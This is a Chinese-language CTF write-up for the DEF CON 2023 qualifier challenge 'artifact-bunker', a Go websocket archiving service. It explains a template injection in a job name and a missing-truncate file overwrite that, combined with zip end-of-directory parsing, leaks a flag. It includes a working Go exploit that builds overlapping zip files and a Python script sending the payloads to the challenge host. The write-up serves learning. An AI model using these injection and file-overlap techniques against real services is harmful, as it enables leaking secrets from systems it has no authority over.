---
layout: post
title: defcon2023-quals artifact-bunker
date: 2023-06-01 15:30 +0800
categories: [ctf, web]
tag: [web, golang]
---

## 题目描述
go写的打包服务，使用websocket通信

## 模板注入
在run_job处，可以注入Name字段，从而打包flag.txt到`/data/aaa.tar`中

## os.O_TRUNC

* os.O_APPEND：当向文件中写入内容时，把新内容追加到现有内容的后边。
* os.O_CREATE：当给定路径上的文件不存在时，创建一个新文件。
* os.O_EXCL：需要与os.O_CREATE一同使用，表示在给定的路径上不能有已存在的文件。
* os.O_SYNC：在打开的文件之上实施同步 I/O。它会保证读写的内容总会与硬盘上的数据保持同步。
* os.O_TRUNC：如果文件已存在，并且是常规的文件，那么就先清空其中已经存在的任何内容。

```golang
func compress_files(ws *websocket.Conn, in_path string) (string, error) {
	in_ext := filepath.Ext(in_path)
	out_path := strings.TrimSuffix(in_path, in_ext)

	dir_name := get_file_name(out_path)

	ur := NewUploadReader(in_path)
	if ur == nil {
		return "", errors.New("Unable to read upload archive")
	}

	out_file, err := os.OpenFile(out_path, os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return "", errors.New("Unable to create compressed directory")
	}
	defer out_file.Close()

	zw := zip.NewWriter(out_file)

	for {
		name, fr, err := ur.Next()
		if err == io.EOF {
			break
		}

		name = strings.TrimLeft(name, "/")

		fw, _ := zw.Create(name)

		if !is_file_ignored(name) {
			fw.Write([]byte("***\n"))
			continue
		}

		// Read full file into memory
		file_data, err := ioutil.ReadAll(fr)

		for _, r := range CONFIG.filter_secrets {
			re := regexp.MustCompile(r)
			file_data = re.ReplaceAll(file_data, []byte("***"))
		}

		fw.Write(file_data)
	}

	ur.Close()
	zw.Close()
	return dir_name, nil
}
```
这个会导致大文件的前半部分是小文件，保留了大文件的一些内容

## zip文件格式
![](/assets/img/2023-06-03-23-07-28.png)
注意，中心目录结束标识只有一个

### golang中寻找中心目录结束标识的代码
倒着从文件后面找`504B0506`，[源码](https://cs.opensource.google/go/go/+/refs/tags/go1.20.4:src/archive/zip/reader.go;l=682)
```golang
func findSignatureInBlock(b []byte) int {
	for i := len(b) - directoryEndLen; i >= 0; i-- {
		// defined from directoryEndSignature in struct.go
		if b[i] == 'P' && b[i+1] == 'K' && b[i+2] == 0x05 && b[i+3] == 0x06 {
			// n is length of comment
			n := int(b[i+directoryEndLen-2]) | int(b[i+directoryEndLen-1])<<8
			if n+directoryEndLen+i <= len(b) {
				return i
			}
		}
	}
	return -1
}
```

利用这个特点，我们可以
* 先上传一个aaa.tar 归档flag.txt到`/data/aaa.tar`
* 上传一个aaa.tar.tar，题目会放到`/data/aaa.tar.tar`, 同时写一个zip文件到`/data/aaa.tar` ，记这个zip文件为xxx.zip
* 再上传一个aaa.tar.zip，题目会放到`/data/aaa.tar.zip`, 同时写一个zip文件到`/data/aaa.tar`,记这个zip文件为yyy.zip
* xxx.zip要大一些，测试过程中，发现必须要覆盖flag内容前的`/`，否则泄漏的文件名会被`/`截断，flag的内容不要覆盖掉
* yyy.zip要小一些，不要覆盖掉xxx.zip的中心目录结束标识 
  * file header的格式为"504B0102____filelen_____filename"
  * 写一个文件名为"504B0102____filelen_____"的文件 同时修改filelen为更大值
  * 该文件名在yyy.zip的起始位置需对齐xxx.zip的File header的起始位置

![](/assets/img/2023-06-03-23-07-44.png)
## exp

```golang
package main

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strings"
)

func get_first_file() {
	out_file, _ := os.OpenFile("temp.zip", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	defer out_file.Close()
	zw := zip.NewWriter(out_file)
	zw.Create(strings.Repeat("B", 150))
	zw.Close()
}

var cdir_len int32
var zip_data1 []byte

func get_cdir() []byte {
	zip_data1, _ = ioutil.ReadFile("temp.zip")
	start := bytes.LastIndex(zip_data1, []byte("\x50\x4b\x01\x02"))
	end := bytes.LastIndex(zip_data1, []byte(strings.Repeat("B", 150)))
	fmt.Println(end - start)
	cdir_len = int32(end - start)
	new_data := zip_data1[start:end]
	fmt.Println(new_data[len(new_data)-18] == 150)
	new_data[len(new_data)-17] = 0x04
	return new_data
}

func get_locator() uint32 {
	data, _ := ioutil.ReadFile("temp.zip")
	start := bytes.LastIndex(data, []byte("\x50\x4b\x05\x06"))
	start = start + 16
	fmt.Println(data[start : start+4])
	return binary.LittleEndian.Uint32(data[start : start+4])
}

func get_random_string(n int) string {
	// 定义随机字符串中包含的字符集合
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	// 生成随机字符串
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	randomString := string(b)
	return randomString
}

func get_second_file() {
	out_file, _ := os.OpenFile("temp1.zip", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	defer out_file.Close()
	zw := zip.NewWriter(out_file)
	fr, _ := zw.Create(string(get_cdir()))
	fr.Write([]byte(get_random_string(57)))
	zw.Close()
}

func check() bool {
	data, _ := ioutil.ReadFile("temp1.zip")
	var value int32 = int32(get_locator())
	fmt.Println(value)
	fmt.Println(value + cdir_len)
	fmt.Println(hex.EncodeToString(data[value : value+cdir_len]))
	fmt.Println(hex.EncodeToString(get_cdir()))
	return hex.EncodeToString(data[value:cdir_len+value]) == hex.EncodeToString(get_cdir())
}
func main() {
	get_first_file()
	get_second_file()
	fmt.Println(check())
}

```



```python
from urllib.parse import quote
import zipfile
import os
import base64
from websocket import create_connection 
"""
job:
  steps:
    - use: archive
      name: "aaa.ext"
      artifacts:
        - "/"
    - use: archive
      name: "end-{{.Commit}}-{{.Timestamp}}"
      artifacts:
        - "bunker-expansion-plan.txt"
        - "new-layer-blueprint.txt"
"""

data = """%s"
      artifacts:
        - "%s"
    - use: archive
      name: "end-"""
def gen(name, archive):
    return data % (name, archive)

def upload(remote_file,local_file):
    return f'upload {remote_file} ' + base64.b64encode(open(local_file,'rb').read()).decode()

if __name__ == "__main__":
    exp = ["clean-all"]
    exp1 = 'job package ' + quote(gen('aaa','flag.txt'))
    exp.append(exp1)
    
    os.system("touch "+"B" * 150)
    
    cmd = ["tar", "-cvf", "one.tar", "B" * 150]
    os.system(" ".join(cmd)) 
    
    exp.append(upload('aaa.tar.tar','one.tar'))
    exp.append(upload('aaa.tar.zip','temp1.zip'))
    exp.append('list .')
    exp.append('list aaa.tar')
    
    
    ws = create_connection("ws://god.cc:10001/ws/")
    for e in exp:
        ws.send(e)
        print(ws.recv())
    
```